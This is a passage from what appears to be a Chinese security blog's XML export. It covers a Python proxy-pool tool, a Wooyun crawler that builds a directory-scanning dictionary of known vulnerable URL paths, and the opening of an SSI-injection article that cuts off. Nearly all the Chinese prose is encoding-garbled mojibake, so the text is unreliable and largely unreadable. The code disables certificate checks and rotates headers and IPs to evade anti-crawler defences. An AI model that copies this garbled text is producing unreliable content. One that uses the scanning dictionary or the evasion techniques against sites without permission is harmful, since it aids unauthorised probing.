self.db.zscore(REDIS_KEY, proxy) if score and score &gt; MIN_SCORE: print(&apos;ä»£ç†&apos;, proxy, u&apos;å½“å‰åˆ†æ•°&apos;, score, u&apos;å‡1&apos;) return self.db.zincrby(REDIS_KEY, proxy, -1) else: print(&apos;ä»£ç†&apos;, proxy, u&apos;å½“å‰åˆ†æ•°&apos;, score, &apos;ç§»é™¤&apos;) return self.db.zrem(REDIS_KEY, proxy) æ£€æµ‹æ¨¡å—ä»£ç†æ£€æµ‹ç¬¬ä¸€æ¬¡å¯ç”¨ï¼Œåˆ™åˆ†æ•°è®¾ç½®ä¸º100ï¼Œä»£ç†ä¸å¯ç”¨ï¼Œåˆ†æ•°å‡1ï¼Œè¿™æ ·å°±å¯ä»¥å®æ—¶æ”¹å˜æ¯ä¸ªä»£ç†çš„å¯ç”¨æƒ…å†µã€‚APIæ¥å£è¿”å›çš„æ—¶å€™åªéœ€è¦è·å–åˆ†æ•°é«˜çš„ä»£ç†å³å¯ã€‚ä½¿ç”¨çš„python3çš„å¼‚æ­¥IOåº“aiohttpï¼Œå‚è€ƒçš„å¤§ç¥çš„è¡¨æ¼”ï¼Œå­¦ä¹ äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Tester(object): def __init__(self): self.redis = RedisClient() async def test_single_proxy(self, proxy): &quot;&quot;&quot; å¼‚æ­¥æµ‹è¯•å•ä¸ªä»£ç†IPå¹¶å†™å…¥redis &quot;&quot;&quot; conn = aiohttp.TCPConnector(verify_ssl=False) async with aiohttp.ClientSession(connector=conn) as session: try: if isinstance(proxy, bytes): proxy = proxy.decode(&apos;utf-8&apos;) real_proxy = &apos;http://&apos; + proxy print(&apos;æ­£åœ¨æµ‹è¯• &gt;&gt;&gt;&apos;, proxy) async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response: if response.status in VALID_STATUS_CODES: self.redis.max(proxy) print(&apos;ä»£ç†å¯ç”¨ &gt;&gt;&gt; &apos;, proxy) else: self.redis.decrease(proxy) print(&apos;è¯·æ±‚å“åº”ç ä¸åˆæ³• &gt;&gt;&gt;&apos;, response.status, &apos;IP&apos;, proxy) except Exception as e: self.redis.decrease(proxy) print(&apos;ä»£ç†è¯·æ±‚å¤±è´¥ &gt;&gt;&gt; &apos;, proxy) def run(self): &quot;&quot;&quot; æµ‹è¯•ä¸»å‡½æ•° &quot;&quot;&quot; print(&apos;*** æµ‹è¯•å™¨å¼€å§‹è¿è¡Œ ***&apos;) try: count = self.redis.count() print(&apos;å½“å‰å‰©ä½™ï¼š&apos;, count, u&apos;ä¸ªä»£ç†&apos;) for i in range(0, count, BATCH_TEST_SIZE): start = i stop = min(i + BATCH_TEST_SIZE, count) print(&apos;æ­£åœ¨æµ‹è¯•ç¬¬&apos;, start + 1, &apos;-&apos;, stop, u&apos;ä¸ªä»£ç†&apos;) test_proxies = self.redis.batch(start, stop) loop = asyncio.get_event_loop() tasks = [self.test_single_proxy(proxy) for proxy in test_proxies] loop.run_until_complete(asyncio.wait(tasks)) sys.stdout.flush() time.sleep(5) except Exception as e: print(&apos;æµ‹è¯•å™¨å‘ç”Ÿé”™è¯¯&apos;, e.args) å®šä¹‰äº†ä¸€ä¸ªç±»Testerï¼Œæ¥ä¸‹æ¥å®šä¹‰äº†ä¸€ä¸ªtest_single_proxy()æ–¹æ³•ï¼Œå¹¶åœ¨å‰é¢åŠ äº†asyncå…³é”®è¯ï¼Œè¿™ä»£è¡¨è¿™ä¸ªæ–¹æ³•æ˜¯å¼‚æ­¥çš„ã€‚æ–¹æ³•å†…éƒ¨é¦–å…ˆåˆ›å»ºäº†aiohttpçš„ClientSessionå¯¹è±¡ï¼Œæ­¤å¯¹è±¡ç±»ä¼¼äºrequestsçš„Sessionå¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨è¯¥å¯¹è±¡çš„get()æ–¹æ³•æ¥è®¿é—®é¡µé¢ã€‚åœ¨è¿™é‡Œï¼Œä»£ç†çš„è®¾ç½®æ˜¯é€šè¿‡proxyå‚æ•°ä¼ é€’ç»™get()æ–¹æ³•ï¼Œç¨‹åºåœ¨è·å–Responseåéœ€è¦åˆ¤æ–­å“åº”çš„çŠ¶æ€ï¼Œå¦‚æœçŠ¶æ€ç åœ¨VALID_STATUS_CODESåˆ—è¡¨é‡Œï¼Œåˆ™ä»£è¡¨ä»£ç†å¯ç”¨ï¼Œå¯ä»¥è°ƒç”¨RedisClientçš„max()æ–¹æ³•å°†ä»£ç†åˆ†æ•°è®¾ä¸º100ï¼Œå¦åˆ™è°ƒç”¨decrease()æ–¹æ³•å°†ä»£ç†åˆ†æ•°å‡1ï¼Œå¦‚æœå‡ºç°å¼‚å¸¸ä¹ŸåŒæ ·å°†ä»£ç†åˆ†æ•°å‡1ã€‚ 0x04 æ¥å£æ¨¡å—ä½¿ç”¨Flaskå®ç°æ¥å£æ¨¡å—ï¼Œå‰ç«¯wgetçš„VulAppsçš„å‰ç«¯æ¨¡ç‰ˆã€‚ 1234567891011121314151617181920212223242526272829303132333435__all__ = [&apos;app&apos;]app = Flask(__name__)def get_conn(): if not hasattr(g, &apos;redis&apos;): g.redis = RedisClient() return g.redis@app.route(&apos;/&apos;)def index(): render = render_template(&apos;index.html&apos;) return make_response(render)@app.route(&apos;/random&apos;)def get_proxy(): &quot;&quot;&quot; è·å–proxyAPI :return: éšæœºä»£ç† &quot;&quot;&quot; conn = get_conn() return conn.random()@app.route(&apos;/count&apos;)def get_counts(): &quot;&quot;&quot; Get the count of proxies :return: ä»£ç†æ± æ€»é‡ &quot;&quot;&quot; conn = get_conn() return str(conn.count())if __name__ == &apos;__main__&apos;: app.run() å‰ç«¯æ¨¡ç‰ˆindex.html é¡¹ç›®åœ°å€ï¼šhttp://proxy.w2n1ck.com:9090/ APIæ¥å£ï¼šhttp://proxy.w2n1ck.com:9090/random 0x05 ä½¿ç”¨æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š è·å–ä»£ç†IPï¼š 123456789import requestsPROXY_POOL_URL = &apos;http://proxy.w2n1ck.com:9090/random&apos;def get_proxy(): try: response = requests.get(PROXY_POOL_URL) if response.status_code == 200: return response.text except ConnectionError: return None ä½¿ç”¨ä»£ç†IPï¼š 1234567891011import requestsproxy = get_proxy()proxies = &#123; &apos;http&apos;: &apos;http://&apos; + proxy, &apos;https&apos;: &apos;https://&apos; + proxy,&#125;try: response = requests.get(&apos;http://ip.cn/&apos;, proxies=proxies) print(response.text)except: pass]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>çˆ¬è™«</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>Redis</tag>
        <tag>ä»£ç†</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¼ç‰¹æ¼æ´æ‰«æ-IoTè®¾å¤‡å®‰å…¨è§£å†³æ–¹æ¡ˆ]]></title>
    <url>%2F2018%2F04%2F23%2F%E4%BC%8F%E7%89%B9%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-IoT%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[# å‰è¨€éšç€æ™ºèƒ½ç¡¬ä»¶çš„å…´èµ·ï¼Œå¤§é‡æ™ºèƒ½å®¶å±…å’Œå¯ç©¿æˆ´è®¾å¤‡è¿›å…¥äº†äººä»¬çš„ç”Ÿæ´»ï¼Œæ ¹æ®Gartner æŠ¥å‘Šé¢„æµ‹ï¼Œ2020å¹´å…¨çƒIOTç‰©è”ç½‘è®¾å¤‡æ•°é‡å°†é«˜è¾¾260äº¿ä¸ªã€‚ä½†æ˜¯ç”±äºå®‰å…¨æ ‡å‡†æ»åï¼Œä»¥åŠæ™ºèƒ½è®¾å¤‡åˆ¶é€ å•†ç¼ºä¹å®‰å…¨æ„è¯†å’ŒæŠ•å…¥ï¼Œç‰©è”ç½‘å·²ç»åŸ‹ä¸‹æå¤§éšæ‚£ï¼Œæ˜¯ä¸ªäººéšç§ã€ä¼ä¸šä¿¡æ¯å®‰å…¨ç”šè‡³å›½å®¶å…³é”®åŸºç¡€è®¾æ–½çš„å¤´å·å®‰å…¨å¨èƒã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œæ— è®ºå®¶ç”¨æˆ–ä¼ä¸šçº§çš„äº’è¿è®¾å¤‡ï¼Œå¦‚æ¥å…¥äº’è”ç½‘çš„äº¤é€šæŒ‡ç¤ºç¯ï¼Œæ’æ¸©å™¨ï¼Œæˆ–åŒ»ç”¨ç›‘æ§è®¾å¤‡é­åˆ°æ”»å‡»ï¼Œåæœéƒ½å°†éå¸¸å¯æ€•ã€‚ ç”±äºç‰¹æ®ŠåŸå› ï¼Œæš‚æ—¶æ— æ³•æŸ¥çœ‹ã€‚ã€‚ã€‚]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>Redis</tag>
        <tag>æ‰«æå™¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wooyunæ¼æ´åœ°å€urlçˆ¬è™«åŠæ•°æ®å¤„ç†]]></title>
    <url>%2F2018%2F03%2F28%2FWooyun%E6%BC%8F%E6%B4%9E%E5%9C%B0%E5%9D%80url%E7%88%AC%E8%99%AB%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰åšæµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°@å››çˆ·å‘ç°ä¸ªæ¼æ´ï¼Œä¸€ä¸ªéå¸¸å¤æ€ªçš„åœ°å€ï¼Œæˆ‘é—®å››çˆ·ï¼šâ€œä½ å’‹çŸ¥é“è¿™ä¸ªçš„ï¼Ÿâ€ï¼Œå››çˆ·è¯´ï¼šâ€œæ‰«çš„å•Šï¼â€ï¼Œæˆ‘ï¼šâ€œã€‚ã€‚ã€‚â€ï¼Œæ‰€ä»¥æ‰æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚ PSï¼šä»¥ä¸Šæ•…äº‹çº¯å±æ‰¯æ·¡ ! 0.0 å…¶å®æ˜¯ä»Šå¹´ç»™è‡ªå·±å®šäº†ä¸ªç›®æ ‡ï¼Œå°±æ˜¯å¥½å¥½æŠŠç¼–ç¨‹ç»™å­¦å¥½ï¼Œæ¯•ç«Ÿè‡ªå·±å®‰å…¨é‚£ä¹ˆèœï¼Œè¯´ä¸å®šå°±å¤±ä¸šäº†ã€‚ã€‚ã€‚ 0x00 è·å–Wooyunæ¼æ´åœ°å€è¿™é‡Œé€‰æ‹©çˆ¬å–çš„ç›®æ ‡æ˜¯https://wooyun.shuimugan.comï¼Œè¿™ä¸ªé•œåƒç«™æœ‰ä¸ªå¥½å¤„ï¼Œå°±æ˜¯å®ƒçš„wooyunæ¼æ´åœ°å€å­˜å…¥æ•°æ®åº“çš„æ—¶å€™ä½¿ç”¨äº†idï¼Œå³https://wooyun.shuimugan.com/bug/view?bug_no=1è¿™ç§å½¢å¼ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦éå†bug_noå³å¯è·å–æ‰€æœ‰çš„æ¼æ´åœ°å€ï¼ˆè¿™é‡Œè€ƒè™‘åˆ°æ•°æ®ä¸‹è½½ã€å¤„ç†ã€æ–‡ä»¶ioç­‰å› ç´ ï¼Œé€‰æ‹©äº†å…ˆæŠŠå­˜åœ¨æ¼æ´çš„urlå…ˆå­˜èµ·æ¥ï¼‰ã€‚ æ„Ÿè°¢ç½‘ç«™çš„ç«™é•¿çš„ä¸æ€ä¹‹æ©ï¼å› ä¸ºï¼Œåœ¨è¿›è¡Œè·å–åœ°å€çš„æ—¶å€™ç”±äºä¸€ç›´å†è°ƒè¯•å¹¶å‘å¼•æ“ï¼Œæ‰€ä»¥çˆ¬äº†å¥½å¤šéã€‚ã€‚ã€‚ åœ¨è·å–å­˜åœ¨æ¼æ´URLçš„æ—¶å€™åªä½¿ç”¨äº†åç¨‹ï¼Œç„¶åä¸»ç¨‹åºä½¿ç”¨çš„è¿›ç¨‹ï¼Œæ•°æ®ä¸‹è½½éƒ¨åˆ†ä½¿ç”¨çš„è¿›ç¨‹+åç¨‹ã€‚ åœ¨ä½¿ç”¨requestsè¯·æ±‚çš„æ—¶å€™è™½ç„¶ä¸€ç›´ç”¨verif=Falseæ¥å¿½ç•¥sslï¼Œä½†æ˜¯ä¼šä¸€ç›´æ‰“å°ï¼š 12/Library/Python/2.7/site-packages/requests/packages/urllib3/connectionpool.py:768: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.org/en/latest/security.htmlInsecureRequestWarning) æçš„å¾ˆä¸çˆ½ï¼Œç™¾åº¦äº†ä¸‹ä½¿ç”¨äº†ä¸‹é¢ä»£ç è§£å†³ï¼š 1234567import ssltry: _create_unverified_https_context = ssl._create_unverified_context # å¿½ç•¥è¯ä¹¦é”™è¯¯except AttributeError: passelse: ssl._create_default_https_context = _create_unverified_https_context è¯·æ±‚çš„æ—¶å€™ä½¿ç”¨äº†é€šç”¨çš„åçˆ¬è™«ç­–ç•¥ï¼š ä¼ªè£…headerå¤´ éšæœºUser-Aagent éšæœºIP è¿™é‡Œæœ¬æ¥æ˜¯æ‰“ç®—ä½¿ç”¨è‡ªå·±çš„ä»£ç†æ± çš„ï¼Œæ— å¥ˆå…è´¹çš„ä»£ç†å®åœ¨æ˜¯æ…¢ï¼Œæµªè´¹æ—¶é—´ï¼ŒåŒæ—¶å¯èƒ½å¯¼è‡´æ•°æ®ä¸å‡†ç¡®ã€‚æ‰€ä»¥å°±æ²¡æœ‰ä½¿ç”¨ä»£ç†IPäº†ã€‚ 1234567headers = &#123;&quot;User-Agent&quot;: random.choice(User-Agent),&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125; åç¨‹éƒ¨åˆ†ï¼š 12345678910from gevent import monkey, poolmonkey.patch_all()reload(sys)sys.setdefaultencoding(&apos;utf8&apos;)p = pool.Pool(150)for i in range(NUM): _url = url + str(i) jobs.append(p.spawn(getURL, _url))gevent.joinall(jobs) ç½‘ç«™bug_noæ€»å…±æœ‰230305ä¸ªï¼Œè·å–åˆ°äº†8ä¸‡å¤šä¸ªå­˜åœ¨æ¼æ´çš„åœ°å€ã€‚ 0x01 ä¸‹è½½æ•°æ®ä¸‹è½½æ•°æ®æ˜¯çˆ¬è™«çš„é‡ç‚¹ï¼Œæœ¬ç€åªå¤šä¸å°‘çš„åŸåˆ™ï¼Œæœ¬æ¥è€ƒè™‘åˆ°å¤§çš„æ•°æ®é‡ï¼Œæ•ˆç‡é—®é¢˜ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯å‘ç°è·å–çš„è„æ•°æ®å¤ªå¤šï¼Œå¯¹åé¢çš„æ•°æ®å¤„ç†é€ æˆäº†å¾ˆå¤šæ— æ³•é¢„çŸ¥çš„éº»çƒ¦ï¼Œæ‰€ä»¥æœ€ç»ˆé€‰æ‹©çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨xpath+reæ¥è¿›è¡Œæ•°æ®å¤„ç†ã€‚ é¦–å…ˆï¼Œä½¿ç”¨xpathè·å–æ¼æ´ç»†èŠ‚éƒ¨åˆ†ï¼ˆæœ‰äº›urlåœ¨pocå­—æ®µï¼Œä½†æ˜¯è€ƒè™‘åˆ°å¤§éƒ¨åˆ†ï¼Œæ‰€ä»¥åªé€‰æ‹©äº†æ¼æ´ç»†èŠ‚å­—æ®µï¼Œæ‰€ä»¥çˆ¬å–çš„ç»“æœä¸æ˜¯å¾ˆå‡†ç¡®ã€‚ï¼‰ xpathï¼š//*[@id=&quot;w0&quot;]/tbody/tr[21]/td/text() è¿™é‡Œé‡åˆ°ä¸ªé—®é¢˜å°±æ˜¯æ— è®ºæ€ä¹ˆå¤åˆ¶ï¼Œéƒ½æ— æ³•è·å–åˆ°æ¼æ´ç»†èŠ‚é‡Œé¢çš„å†…å®¹ï¼Œä½¿ç”¨chromeçš„xpath helperä¹Ÿçš„ç¡®æ˜¯èƒ½åŒ¹é…åˆ°å†…å®¹ï¼Œå®åœ¨æ˜¯éƒé—·ï¼æœ€ç»ˆåœ¨æˆ‘@åŠ è²çŒ«å’Œ@nearg1eæ–Œå“¥å“¥çš„å¸®åŠ©ä¸‹æ‰¾åˆ°äº†åŸå› ã€‚ åŸå› åœ¨äºï¼šchromeæµè§ˆå™¨åœ¨è¿›è¡Œé¡µé¢æ¸²æŸ“æ—¶ä½¿ç”¨äº†htmlparseè¿›è¡Œäº†å¤„ç†ï¼Œæ‰€ä»¥è¯¸å¦‚tbodyç­‰ä¸€äº›æ ‡ç­¾æ˜¯chromeè‡ªåŠ¨åŠ è½½çš„ã€‚ æœ€ç»ˆçš„xpathï¼š//*[@id=&quot;w0&quot;]/tr[21]/td//text() ä¸‹é¢å°±æ˜¯ä»æ¼æ´ç»†èŠ‚ä¸­è·å–æ‰€æœ‰çš„URLäº†ï¼Œè¿™é‡Œè¿˜æ˜¯ä¸ºäº†æ›´å¤šçš„è·å–URLï¼Œæ‰¾äº†ä¸ªéå¸¸å…¨é¢çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š 1r = re.compile(r&apos;(?i)\b((?:[a-z][\w-]+:(?:/&#123;1,3&#125;|[a-z0-9%])|www\d&#123;0,3&#125;[.]|[a-z0-9.\-]+[.][a-z]&#123;2,4&#125;/)(?:[^\s()&lt;&gt;]+|\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\))+(?:\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\)|[^\s\`!()\[\]&#123;&#125;;:\&apos;&quot;.,&lt;&gt;?Â«Â»â€œâ€â€˜â€™]))&apos;) å¯¼è‡´åŒ¹é…çš„URLä»€ä¹ˆå¥‡è‘©éƒ½æœ‰ï¼Œå…·ä½“å¯çœ‹ï¼šdicc.txtçš„å†…å®¹ åœ¨ä½¿ç”¨è¿™ä¸ªreçš„æ—¶å€™åˆé‡åˆ°ä¸ªé—®é¢˜ï¼Œç¨‹åºè·‘ç€è·‘ç€åœäº†ï¼Œå¾ˆæ˜¯æ— è¯­ï¼Œåæ¥ç»å¸®åŠ©è°ƒè¯•å‘ç°æ˜¯æœ‰äº›sqlæ³¨å…¥çš„URLä¸­å­˜åœ¨(,)è¿™ä¸¤ä¸ªå­—ç¬¦ï¼Œå¯¼è‡´æ­£åˆ™æ­»æ‰ï¼Œä¸ºäº†å›¾æ–¹ä¾¿ï¼Œç›´æ¥åšäº†ä¸ªåˆ¤æ–­ç»™å‰”é™¤äº† -ã€‚- å¹¶å‘éƒ¨åˆ†å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š123456789101112131415161718192021222324252627...def create_process(level, jobqueue, plugins, debug, headers): for _ in range(level): process = multiprocessing.Process(target=worker, args=(jobqueue, plugins, debug, headers)) process.daemon = True process.start()def worker(jobqueue, plugins, debug, headers): while True: try: target = jobqueue.get() gevent_scan_task(target, plugins, debug, headers) except Exception, e: print traceback.format_exc() finally: jobqueue.task_done()def gevent_scan_task(target, plugins, debug, headers): evt = Event() pool = [] scanmodle = ScanModle(target, plugins, debug, headers) pool.append(gevent.spawn(scanmodle.scan_port(evt))) pool.append(gevent.spawn(scanmodle.scan_plugins(evt))) for port in scanmodle.get_ports(): pool.append(gevent.spawn(scanmodle.scan_plugins(evt, port))) gevent.joinall(pool) save_cache(scanmodle) æœ€ç»ˆè·å–åˆ°äº†153217ä¸ªåœ°å€ 0x02 æ•°æ®å¤„ç†è¿™éƒ¨åˆ†è¯´éš¾ä¹Ÿéš¾è¯´ä¸éš¾ä¹Ÿä¸éš¾ï¼Œæˆ‘æ˜¯ä¸å¤ªåœ¨è¡Œã€æ‚è„¸ã€‘ï¼Œç›®å‰æˆ‘å¤„ç†çš„æ­¥éª¤å¦‚ä¸‹ï¼š å»é™¤æ‰€æœ‰ä¸­æ–‡éƒ¨åˆ†ï¼ˆè¿™é‡Œç”±äºæœ‰äº›urlä¸­çš„ç¡®æ˜¯å¸¦ä¸­æ–‡ï¼Œæ‰€æœ‰ä½¿ç”¨æ¢è¡Œæ›¿æ¢ï¼‰ å»é™¤æ‰€æœ‰åªæœ‰/ï¼Œ.åŠlen(strip(link) == 0çš„éƒ¨åˆ† è·å–æ‰€æœ‰URLä¸­çš„ç›®å½•éƒ¨åˆ†(ä½¿ç”¨urlparse) å»é™¤ä¸€äº›å…¶ä»–æ¯”å¦‚wooyun/bugsï¼Œjdbcï¼Œ**ï¼Œxmlnsï¼Œt.cnï¼Œldapï¼Œsshç­‰éé¢„æœŸå­—ç¬¦åŠé•¿åº¦å°äºç­‰äº4çš„éƒ¨åˆ† ä½¿ç”¨urlparseè·å–p.path, p.query,p.fragment,å¹¶ä½¿ç”¨isinstanceæ¥åˆ¤æ–­ä¸¤ä¸ªURLæ˜¯å¦ç›¸åŒæ¥å»é‡ è¯´æ˜ï¼š 1ã€ç¬¬ä¸‰æ­¥æ²¡æœ‰ä½¿ç”¨è¿­ä»£ï¼Œæ¯”å¦‚ï¼š 12345678/wooyun/bugs/?id=1æ²¡æœ‰è·å–ï¼š?id=1/wooyun/wooyun/bugs/åªæ˜¯è·å–åˆ°ï¼š/wooyun/bugs/?id=1æœ‰å…´è¶£å¯å‚è€ƒï¼šhttps://github.com/Xyntax/POC-T/blob/2.0/plugin/urlparser.py ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415import urlparseimport sysreload(sys)sys.setdefaultencoding(&apos;utf-8&apos;)def iterate_path(ori_str):# parser = urlparse.urlparse(ori_str)# _path_list = parser.path.replace(&apos;//&apos;, &apos;/&apos;).strip(&apos;/&apos;).split(&apos;/&apos;)# print _path_list _ans_list = set() _ans_list.add(ori_str) _ans_list = list(_ans_list) for i in range(len(_ans_list)): p = urlparse.urlparse(_ans_list[i]) return urlparse.urlunsplit([&apos;&apos;, &apos;&apos;, p.path, p.query, p.fragment]) 2ã€ç¬¬äº”æ­¥æ˜¯ç®€å•å»é™¤å¦‚ä¸‹ç±»å‹çš„URLï¼š 1234567/wooyun/?id=1&amp;url=123/wooyun/?id=2&amp;url=233/wooyun/?id=3&amp;url=666å’Œ/wooyun/1.html/wooyun/233.html/wooyun/6666.html 0x03 åç»­å…¶å®æˆ‘ä¸»è¦æ˜¯æƒ³è·å–ä¸ªæ‰«æç›®å½•çš„å­—å…¸ï¼Œä½†æ˜¯å¦‚æœå‘æ•£ä¸‹å‘¢ï¼Ÿè¿™äº›URLæœ‰ä»€ä¹ˆç”¨ï¼Ÿ æˆ‘æ€è€ƒçš„å¦‚ä¸‹ï¼š 1ã€åœ¨æˆ‘åˆšç®—å…¥é—¨å®‰å…¨çš„æ—¶å€™wooyunå½å½äº†ï¼Œæ‰€ä»¥æœ‰äº›æ¼æ´è‡ªå·±åŸºæœ¬ä¸Šæ²¡è§è¿‡ï¼Œè¦æ˜¯åœ¨ä¸€ä¸ªä¸€ä¸ªå»çœ‹æ–‡ç« ï¼Œé‚£ä»£ä»·å¤ªå¤§äº†ä¹Ÿæ²¡æœ‰æ—¶é—´ã€‚ä½¿ç”¨è¿™ä¸ªåšç›®å½•æ‰«æçš„æ—¶å€™ï¼Œå¦‚æœå‘ç°å­˜åœ¨æ­¤URLï¼Œé‚£ä¹ˆè¯´æ˜åœ¨wooyunä¸Šæ˜¯å­˜åœ¨è¿™ä¸ªæ¼æ´çš„ï¼Œå¦‚æœè‡ªå·±ä¸çŸ¥é“å°±å¯ä»¥æœä¸€æ³¢ï¼Œå­¦ä¹ ä¸‹äº†ï¼Œå¿«æ·ã€é«˜æ•ˆã€‚ 2ã€åšagentã€å…¥ä¾µé˜²å¾¡ã€æ€åŠ¿æ„ŸçŸ¥çš„è¯ï¼Œå¯æŠŠè¿™äº›åšæˆæ¼æ´åº“ï¼Œé‡åˆ°è®¿é—®è¿™äº›åœ°å€å°±å¯ä»¥æ¥ä¸ªå‘Šè­¦ï¼Œä¹Ÿå¯ä»¥å½“ä¸ªå¨èƒæƒ…æŠ¥ææã€‚ 3ã€åšä¸ªæ¼æ´åˆ†æï¼Œçœ‹çœ‹å¤§ä½¬ä»¬éƒ½å–œæ¬¢æäº¤å•¥æ¼æ´ï¼ˆæˆ‘ä¸ä¼šå‘Šè¯‰ä½ æ’åœ¨ç¬¬ä¸€äºŒçš„æ˜¯svnå’Œgitï¼‰ è·å–çš„æ•°æ®ï¼Œå¤„ç†å’Œæ²¡å¤„ç†çš„éƒ½å¯ä»¥åœ¨ä¸‹é¢åœ°å€ä¸‹è½½ï¼ˆPSï¼šå¤„ç†çœŸçš„åªæ˜¯ç®€å•å¤„ç†ï¼Œæ¯”å¦‚å¤§ä½¬ä»¬ä¸Šä¼ çš„webshellã€ä¸€äº›åªé’ˆå¯¹æŸä¸ªç½‘ç«™çš„URLç­›é€‰ç­‰éƒ½å¾—åšï¼Œï¼Œï¼Œæ…ç”¨ï¼åç»­è¿˜å¾—ä¼˜åŒ–ï¼Œå¤§ä½¬ä»¬æœ‰å…´è¶£çš„è¯å¸¦å¸¦æˆ‘ã€‚ 0.0ï¼‰ æœªå¤„ç†ï¼šdicc.txt å·²å¤„ç†ï¼šdicc8.txt]]></content>
      <tags>
        <tag>çˆ¬è™«</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>æ¼æ´æŒ–æ˜</tag>
        <tag>Wooyun</tag>
        <tag>å­—å…¸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSI-æœåŠ¡å™¨ç«¯åŒ…å«æ³¨å…¥]]></title>
    <url>%2F2018%2F01%2F05%2FSSI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[å‰æ®µæ—¶é—´åˆšå¥½åœ¨ä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°äº†ä¸€ä¸ªSSIçš„æ–‡ç« ï¼Œç°åœ¨è¿™ç§ä¸šåŠ¡åŸºæœ¬ä¸Šå¾ˆå°‘è§äº†ï¼Œä¹‹å‰ä¹Ÿæ²¡äº†è§£è¿‡(åŸè°…æˆ‘æ˜¯èœé¸¡â€”_-!)æ²¡ç•™æ„è¿‡ã€‚è¿æ°”å¥½ï¼Œåˆšå¥½åœ¨å¾®åšä¸Šç»™é‡åˆ°äº†ï¼Œæ‰€ä»¥è®°å½•ä¸‹å­¦ä¹ è¿‡ç¨‹ã€‚ 0x01 å…³äºSSISSIæ˜¯è‹±æ–‡â€Server Side Includesâ€çš„ç¼©å†™ï¼Œç¿»è¯‘æˆä¸­æ–‡å°±æ˜¯æœåŠ¡å™¨ç«¯åŒ…å«çš„æ„æ€ã€‚SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚ ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚ 1.1 å¯ç”¨SSIç¤ºä¾‹ï¼šNginx é…ç½®SSIåŠŸèƒ½ åœ¨httpæ®µä¸­åŠ å…¥ä¸‹é¢å‡ å¥å³å¯ï¼š123ssi on;ssi_silent_errors off;ssi_types text/shtml; é»˜è®¤Apacheä¸å¼€å¯SSIï¼ŒSSIè¿™ç§æŠ€æœ¯å·²ç»æ¯”è¾ƒå°‘ç”¨äº†ã€‚å¦‚æœåº”ç”¨æ²¡æœ‰ä½¿ç”¨åˆ°SSIï¼Œå…³é—­æœåŠ¡å™¨å¯¹SSIçš„æ”¯æŒå³å¯ã€‚ IISå’ŒApacheéƒ½å¯ä»¥å¼€å¯SSIåŠŸèƒ½ï¼Œå…·ä½“å¯å‚è€ƒ:http://m.jb51.net/article/25725.htm 1.2 SSIè¯­æ³•é¦–å…ˆï¼Œä»‹ç»ä¸‹SHTMLï¼Œåœ¨SHTMLæ–‡ä»¶ä¸­ä½¿ç”¨SSIæŒ‡ä»¤å¼•ç”¨å…¶ä»–çš„htmlæ–‡ä»¶ï¼ˆ#includeï¼‰ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šå°†SHTMLä¸­åŒ…å«çš„SSIæŒ‡ä»¤è§£é‡Šï¼Œå†ä¼ 